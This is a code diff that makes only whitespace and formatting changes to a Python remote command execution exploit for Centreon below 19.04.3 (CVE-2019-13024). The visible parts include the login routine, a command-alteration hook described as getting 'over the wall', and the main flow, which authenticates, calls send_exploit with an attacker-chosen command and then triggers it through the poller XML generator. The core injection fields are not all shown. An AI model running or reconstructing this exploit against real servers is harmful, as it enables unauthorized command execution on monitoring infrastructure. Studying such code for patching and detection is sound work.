@@ -4,7 +4,6 @@ from bs4 import BeautifulSoup
 import requests
 
 
-
 '''
 Centreon < 19.04.3 Remote Command Execution
 HOW TO USE:
@@ -20,6 +19,7 @@ https://github.com/mhaskar/ (https://github.com/mhaskar/CVE-2019-13024)
 https://nvd.nist.gov/vuln/detail/CVE-2019-13024
 '''
 
+
 # Authenticate to Centreon
 def authenticate(username, password, url, session, verbose=False):
 
@@ -32,11 +32,11 @@ def authenticate(username, password, url, session, verbose=False):
 
     # Login form
     payload = {
-            "useralias": username,
-            "password": password,
-            "submitLogin": "Connect",
-            "centreon_token": token
-            }
+        "useralias": username,
+        "password": password,
+        "submitLogin": "Connect",
+        "centreon_token": token
+    }
 
     # Log in
     r = session.post(url, data=payload)
@@ -55,7 +55,7 @@ def authenticate(username, password, url, session, verbose=False):
 
 # Alter command to get over the wall
 def edit_command(command):
-    
+
     # Your customizations here
     payload = command
     print(f"{command} --> {payload}")
@@ -118,7 +118,6 @@ def send_exploit(command, url, session, verbose=False):
         print(soup.prettify())
 
 
-
 def trigger_exploit(url, session, verbose=False):
     xml_page_data = {
         "poller": "1",
@@ -131,7 +130,6 @@ def trigger_exploit(url, session, verbose=False):
     if verbose:
         soup = BeautifulSoup(r.content, 'html.parser')
         print(soup.prettify())
-
 
 
 def main():
@@ -149,12 +147,12 @@ def main():
     session = requests.session()
 
     # Log in
-    authenticate(args.username, args.password, host_index, session, verbose=args.verbose)
+    authenticate(args.username, args.password, host_index,
+                 session, verbose=args.verbose)
 
     # EXPLOIT
     send_exploit(command, host_poller_config, session, verbose=args.verbose)
     trigger_exploit(host_xml_generator, session, verbose=args.verbose)
-
 
 
 if __name__ == '__main__':
@@ -191,5 +189,5 @@ if __name__ == '__main__':
         help="Verbose output"
     )
     args = parser.parse_args()
-   
+
     main()
